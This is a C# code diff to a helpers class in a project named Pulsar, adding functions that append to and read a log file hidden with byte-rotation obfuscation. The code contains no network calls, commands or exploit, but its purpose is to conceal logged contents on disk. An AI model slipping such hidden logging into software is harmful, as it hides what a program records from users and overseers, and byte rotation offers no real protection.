@@ -97,5 +97,37 @@ namespace Pulsar.Common.Helpers
         {
             return File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
         }
+
+        /// <summary>
+        /// Appends text to an obfuscated log file using byte rotation.
+        /// </summary>
+        /// <param name="filename">The filename of the log.</param>
+        /// <param name="appendText">The text to append.</param>
+        public static void WriteObfuscatedLogFile(string filename, string appendText)
+        {
+            appendText = ReadObfuscatedLogFile(filename) + appendText;
+
+            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
+            {
+                byte[] data = ByteRotationObfuscator.Obfuscate(Encoding.UTF8.GetBytes(appendText));
+                fStream.Seek(0, SeekOrigin.Begin);
+                fStream.Write(data, 0, data.Length);
+            }
+        }
+
+        /// <summary>
+        /// Reads an obfuscated log file using byte rotation.
+        /// </summary>
+        /// <param name="filename">The filename of the log.</param>
+        /// <returns>The deobfuscated log content.</returns>
+        public static string ReadObfuscatedLogFile(string filename)
+        {
+            if (!File.Exists(filename))
+                return string.Empty;
+
+            byte[] obfuscatedData = File.ReadAllBytes(filename);
+            byte[] deobfuscatedData = ByteRotationObfuscator.Deobfuscate(obfuscatedData);
+            return Encoding.UTF8.GetString(deobfuscatedData);
+        }
     }
 }
